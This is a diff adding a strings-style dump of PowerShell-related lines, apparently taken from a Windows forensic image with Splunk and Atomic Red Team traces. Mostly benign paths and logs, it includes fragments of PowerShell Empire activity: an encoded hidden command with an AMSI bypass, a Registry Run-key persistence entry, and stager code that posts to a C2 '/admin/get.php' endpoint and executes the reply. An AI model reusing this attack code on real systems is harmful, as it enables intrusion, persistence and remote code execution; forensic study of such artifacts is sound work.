@@ -1,0 +1,1047 @@
+Windows PowerShell
+WindowsPowerShell
+powershell_ise.exe
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+Please run the Get-WindowsUpdateLog PowerShell command to convert ETW traces into a readable WindowsUpdate.log.
+        $str += "|powershell|" + $PSVersionTable.PSVersion.Major;
+ServerComponent_RSAT_RemoteAccess_PowerShell
+RSAT-RemoteAccess-PowerShell
+ServerComponent_WindowsPowerShellWebAccess
+WindowsPowerShellWebAccess
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+ParentImage: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+ParentCommandLine: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -NoP -NonI -w Hidden -enc SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAYgBsAGUALgBQAFMAVgBlAHIAcwBpAG8AbgAuAE0AYQBqAG8AcgAgAC0AZwBlACAAMwApAHsAJABSAGUAZgA9AFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAOwAkAFIAZQBmAC4ARwBlAHQARgBpAGUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdAB2AGEAbAB1AGUAKAAkAE4AdQBsAGwALAAkAHQAcgB1AGUAKQA7AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBFAHYAZQBuAHQAaQBuAGcALgBFAHYAZQBuAHQAUAByAG8AdgBpAGQAZQByAF0ALgBHAGUAdABGAGkAZQBsAGQAKAAnAG0AXwBlAG4AYQBiAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwASQBuAHMAdABhAG4AYwBlACcAKQAuAFMAZQB0AFYAYQBsAHUAZQAoAFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBUAHIAYQBjAGkAbgBnAC4AUABTAEUAdAB3AEwAbwBnAFAAcgBvAHYAaQBkAGUAcgAnACkALgBHAGUAdABGAGkAZQBsAGQAKAAnAGUAdAB3A
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\WindowsApps
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\WindowsApps
+s-PowerShell-ServerCore-Package~
+source::C:\Windows\System32\Winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx
+\Device\HarddiskVolume1\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exel
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+OW64\WindowsPowerShell\v1.0\powershell.e
+08-30-2024 16:17:44.532 -0700 INFO  Metrics - group=per_source_thruput, series="c:\windows\system32\winevt\logs\windows powershell.evtx", kbps=0.632, eps=0.147, kb=38.578, ev=9, avg_age=11.333, max_age=12, interval_sec=60
+08-30-2024 16:17:44.532 -0700 INFO  Metrics - group=per_sourcetype_thruput, series="wineventlog:windows powershell", kbps=0.632, eps=0.147, kb=38.578, ev=9, avg_age=11.333, max_age=12, interval_sec=60
+09/15/2018 09:10:08.532 [1204]: 1>    Compiling assembly Microsoft.PowerShell.ScheduledJob, Version=3.0.0.0, Culture=Neutral, PublicKeyToken=31bf3856ad364e35, processorArchitecture=msil (CLR v4.0.30319) ...
+09/15/2018 09:10:08.575 [1204]: 1>Installed native image for assembly Microsoft.PowerShell.ScheduledJob, Version=3.0.0.0, Culture=Neutral, PublicKeyToken=31bf3856ad364e35, processorArchitecture=msil from repository.
+09/15/2018 09:10:08.775 [1204]: 5>    Compiling assembly Microsoft.PowerShell.Management.Activities, Version=3.0.0.0, Culture=Neutral, PublicKeyToken=31bf3856ad364e35, processorArchitecture=msil (CLR v4.0.30319) ...
+gramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\WindowsApps
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Path=C:\Program Files (x86)\Mozilla Firefox;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\alice\AppData\Local\Microsoft\WindowsApps;
+{D65231B0-B2F1-4857-A4CE-A8E7C6EA7D27}\WindowsPowerShell\v1.0\powershell.exe
+C:\Users\alice\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Windows PowerShell\Windows PowerShell.lnk
+PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\alice\AppData\Local\Microsoft\WindowsApps;
+PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\WindowsApps
+powershell~
+powershell_ise~
+powershell.exe~
+powershell ise~
+powershell ise (x86)~
+powershell (x86)~
+C:\Windows\System32\Winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\WindowsApps
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\WindowsApps
+Path=C:\Program Files (x86)\Mozilla Firefox;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\alice\AppData\Local\Microsoft\WindowsApps;
+        $str += "|powershell|" + $PSVersionTable.PSVersion.Major;
+PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPower
+Path=C:\Program Files (x86)\Mozilla Firefox;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\alice\AppData\Local\Microsoft\WindowsApps;
+PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+powershell2
+powershell2
+powershell_RASMANCST)
+Image: C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe
+CommandLine: "C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe" --ps2
+GEAdABhAFsANAAuAC4AJABkAGEAdABhAC4AbABlAG4AZwB0AGgAXQA7AC0AagBvAGkAbgBbAEMAaABhAHIAWwBdAF0AKAAmACAAJABSACAAJABkAGEAdABhACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=;$null=Set-ItemProperty -Force -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Updater -Value '"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "$x=$((gp HKCU:Software\Microsoft\Windows\CurrentVersion Debug).Debug);powershell -Win Hidden -enc $x"';'Registry persistence established using listener http_9003 stored in HKCU:Software\Microsoft\Windows\CurrentVersion\Debug.'
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+ParentImage: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+ParentCommandLine: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -NoP -NonI -w Hidden -c $x=$((gp HKCU:Software\Microsoft\Windows Update).Update); powershell -NoP -NonI -w Hidden -enc $x; Start-Sleep -Seconds 1\system32\cleanmgr.exe /autoclean /d C:
+08-30-2024 16:05:49.884 -0700 INFO  TailReader [2784 tailreader0] - Archive file='C:\Windows\System32\Winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx' updated less than 10000ms ago, will not read it until it stops changing. File size=2166784
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+ Initial release for submission to the PowerShell Gallery
+Path: C:\Users\alice\Documents\WindowsPowerShell\Modules\Invoke-AtomicRedTeam\2.0.4\Invoke-AtomicRedTeam.psd1
+    # Private data to pass to the module specified in RootModule/ModuleToProcess. This may also contain a PSData hashtable with additional module metadata used by PowerShell.
+* Adding 'powershell-yaml' to RequiredModules in the module manifest
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+g 'C:\Windows\System32\Winevt\Logs\Windows PowerShell.evtx'
+08-30-2024 16:17:34.328 -0700 INFO  WinEventLogInputProcessor [3068 WinEventLogInputProcessor] - main-thread: Finished processing existing Windows Event Log 'C:\Windows\System32\Winevt\Logs\Windows PowerShell.evtx': total_events='0' with empty_msg='0'.
+08-30-2024 16:19:03.021 -0700 INFO  WinEventLogInputProcessor [3068 WinEventLogInputProcessor] - main-thread: Finished processing existing Windows Event Log 'C:\Windows\System32\Winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx': total_events='7' with empty_msg='0'.
+08-30-2024 15:46:35.770 -0700 INFO  TailReader [2784 tailreader0] - Archive file='C:\Windows\System32\Winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx' has stopped changing, will read it now.
+08-30-2024 15:46:35.770 -0700 INFO  ArchiveProcessor [3040 archivereader] - Handling file=C:\Windows\System32\Winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx
+08-30-2024 15:46:35.772 -0700 INFO  ArchiveProcessor [3040 archivereader] - Processing windows event log file C:\Windows\System32\Winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx
+Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Unregister-ClusteredScheduledTask' -Alias '*'
+|powershell|" + $PSVersionTable.PSVersion.Major;$i += "|" + $env:PROCESSOR_ARCHITECTURE;$ib2=$e.getbytes($i);$eb2=$IV+$AES.CreateEncryptor().TransformFinalBlock($ib2,0,$ib2.Length);$hmac.Key = $e.GetBytes($key);$eb2 = $eb2+$hmac.ComputeHash($eb2)[0..9];$IV2=[BitConverter]::GetBytes($(Get-Random));$data2 = $e.getbytes($ID) + @(0x01,0x03,0x00,0x00) + [BitConverter]::GetBytes($eb2.Length);$rc4p2 = ConvertTo-RC4ByteStream -RCK $($IV2+$SKB) -In $data2;$rc4p2 = $IV2 + $rc4p2 + $eb2;if ($customHeaders -ne "") {$headers = $customHeaders -split ',';$headers | ForEach-Object {$headerKey = $_.split(':')[0];$headerValue = $_.split(':')[1];if ($headerKey -eq "host"){try{$ig=$WC.DownloadData($s)}catch{}};$wc.Headers.Add($headerKey, $headerValue);}}$wc.Headers.Add("User-Agent",$UA);$wc.Headers.Add("Hop-Name",$hop);$raw=$wc.UploadData($s+"/admin/get.php", "POST", $rc4p2);IEX $( $e.GetString($(Decrypt-Bytes -Key $key -In $raw)) );$AES=$null;$s2=$null;$wc=$null;$eb2=$null;$raw=$null;$IV=$null;$wc=$null;$i=$null;$ib2=$null;[GC]::Collect();Invoke-Empire -Servers @(($s -split "/")[0..2] -join "/") -StagingKey $SK -SessionKey $key -SessionID $ID -WorkingHours "" -KillDate "" -ProxySettings $Script:Proxy;}
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'InputObject'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
+          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'InputObject'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
+      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }
+      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('UnregisterByObject', $__cmdletization_methodParameters, $__cmdletization_returnValue)
+*|windows powershell
+*|powershell (x86)
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+Microsoft.PowerShellXMLData.1
+Microsoft.PowerShellSessionConfiguration.1
+Path=C:\Program Files (x86)\Mozilla Firefox;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\alice\AppData\Local\Microsoft\WindowsApps;
+Path=C:\Program Files (x86)\Mozilla Firefox;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\alice\AppData\Local\Microsoft\WindowsApps;
+PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+09/15/2018 09:09:56.243 [1204]: Failed to load the runtime. (Exception from HRESULT: 0x80131700). Assembly Microsoft.PowerShell.Commands.Diagnostics, Version=1.0.0.0, Culture=Neutral, PublicKeyToken=31bf3856ad364e35, processorArchitecture=msil requires version v2.0.50727 of the runtime to run.
+09/15/2018 09:09:56.243 [1204]: Failed to load the runtime. (Exception from HRESULT: 0x80131700). Assembly Microsoft.PowerShell.Commands.Management, Version=1.0.0.0, Culture=Neutral, PublicKeyToken=31bf3856ad364e35, processorArchitecture=msil requires version v2.0.50727 of the runtime to run.
+09/15/2018 09:09:56.259 [1204]: Failed to load the runtime. (Exception from HRESULT: 0x80131700). Assembly Microsoft.PowerShell.ConsoleHost, Version=1.0.0.0, Culture=Neutral, PublicKeyToken=31bf3856ad364e35, processorArchitecture=msil requires version v2.0.50727 of the runtime to run.
+09/15/2018 09:09:56.275 [1204]: Failed to load the runtime. (Exception from HRESULT: 0x80131700). Assembly Microsoft.PowerShell.Commands.Utility, Version=1.0.0.0, Culture=Neutral, PublicKeyToken=31bf3856ad364e35, processorArchitecture=msil requires version v2.0.50727 of the runtime to run.
+09/15/2018 09:09:56.275 [1204]: Failed to load the runtime. (Exception from HRESULT: 0x80131700). Assembly Microsoft.PowerShell.Security, Version=1.0.0.0, Culture=Neutral, PublicKeyToken=31bf3856ad364e35, processorArchitecture=msil requires version v2.0.50727 of the runtime to run.
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+tindows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\Sb
+PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Wio
+Path=C:\Program Files (x86)\Mozilla Firefox;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\alice\AppData\Local\Microsoft\WindowsApps;
+PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+EntityFramework.PowerShell, Culture=neutral, PublicKeyToken=b77a5c561934e089
+EntityFramework.PowerShell.Utility, Version=5.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089
+tindows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\Sb
+PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Wio
+Path=C:\Program Files (x86)\Mozilla Firefox;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\alice\AppData\Local\Microsoft\WindowsApps;
+PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Windows PowerShell ISE (x86).lnk=@%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe,-102
+Windows PowerShell ISE.lnk=@%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe,-101
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+MICROSOFT.POWERSHELL
+PowerShellVersion
+Microsoft.PowerShell
+PowerShellEngine
+PowerShellVersion
+#source::C:\Windows\System32\Winevt\Logs\Windows PowerShell.evtx|host::Client2.BCS.local|WinEventLog:Windows PowerShell|
+PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPower
+Path=C:\Program Files (x86)\Mozilla Firefox;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\alice\AppData\Local\Microsoft\WindowsApps;
+PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+                        $ps = [PowerShell]::Create();
+ndows-PowerShell/Operational
+Powershell
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\syste
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\WindowsApps
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windo2
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\
+|powershell|" + $PSVersionTable.PSVersion.Major;$i += "|" + $env:PROCESSOR_ARCHITECTURE;$ib2=$e.getbytes($i);$eb2=$IV+$AES.CreateEncryptor().TransformFinalBlock($ib2,0,$ib2.Length);$hmac.Key = $e.GetBytes($key);$eb2 = $eb2+$hmac.ComputeHash($eb2)[0..9];$IV2=[BitConverter]::GetBytes($(Get-Random));$data2 = $e.getbytes($ID) + @(0x01,0x03,0x00,0x00) + [BitConverter]::GetBytes($eb2.Length);$rc4p2 = ConvertTo-RC4ByteStream -RCK $($IV2+$SKB) -In $data2;$rc4p2 = $IV2 + $rc4p2 + $eb2;if ($customHeaders -ne "") {$headers = $customHeaders -split ',';$headers | ForEach-Object {$headerKey = $_.split(':')[0];$headerValue = $_.split(':')[1];if ($headerKey -eq "host"){try{$ig=$WC.DownloadData($s)}catch{}};$wc.Headers.Add($headerKey, $headerValue);}}$wc.Headers.Add("User-Agent",$UA);$wc.Headers.Add("Hop-Name",$hop);$raw=$wc.UploadData($s+"/admin/get.php", "POST", $rc4p2);IEX $( $e.GetString($(Decrypt-Bytes -Key $key -In $raw)) );$AES=$null;$s2=$null;$wc=$null;$eb2=$null;$raw=$null;$IV=$null;$wc=$null;$i=$null;$ib2=$null;[GC]::Collect();Invoke-Empire -Servers @(($s -split "/")[0..2] -join "/") -StagingKey $SK -SessionKey $key -SessionID $ID -WorkingHours "" -KillDate "" -ProxySettings $Script:Proxy;}
+C:\Windows\System32\Winevt\Logs\Windows PowerShell.evtx
+{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}_WindowsPowerShell_v1_0_PowerShell_ISE_exe
+.0\powershell.exe
+gramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\WindowsApps
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+C:\Windows\System32\Winevt\Logs\Microsoft-Windows-PowerShell-DesiredStateConfiguration-FileDownloadManager%4Operational.evtx
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\WindowsApps
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\WindowsApps
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\WindowsApps
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\WindowsApps
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\WindowsApps
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+MICROSOFT.POWERSHELL
+Path=C:\Program Files\SplunkUniversalForwarder\bin;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\WindowsApps
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+C:\Windows\System32\Winevt\Logs\Microsoft-Windows-PowerShell-DesiredStateConfiguration-FileDownloadManager%4Operational.evtx
+C:\Windows\System32\Winevt\Logs\Microsoft-Windows-PowerShell-DesiredStateConfiguration-FileDownloadManager%4Operational.evtx
+{D65231B0-B2F1-4857-A4CE-A8E7C6EA7D27}\WindowsPowerShell\v1.0\PowerShell_ISE.exe	9647
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\WindowsApps
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\WindowsApps
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\syste
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\WindowsApps
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\
+HYPERV-HOST-COMPUTE-POWERSHELL-MODULE-PACKAGE~31BF3856AD364E35~AMD64~~10.0.17763.1
+%SystemRoot%_System32_WindowsPowerShell_v1.0_powershell.exe
+%SystemRoot%_SysWOW64_WindowsPowerShell_v1.0_powershell.exe
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\alice\AppData\Local\Microsoft\WindowsApps
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Path=C:\Program Files (x86)\Mozilla Firefox;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\alice\AppData\Local\Microsoft\WindowsApps;
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\sy
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\ServiceProfiles\NetworkService\AppData\Local\Microsoft\WindowsApps
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+C:\Users\alice\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Windows PowerShell\Windows PowerShell.lnk
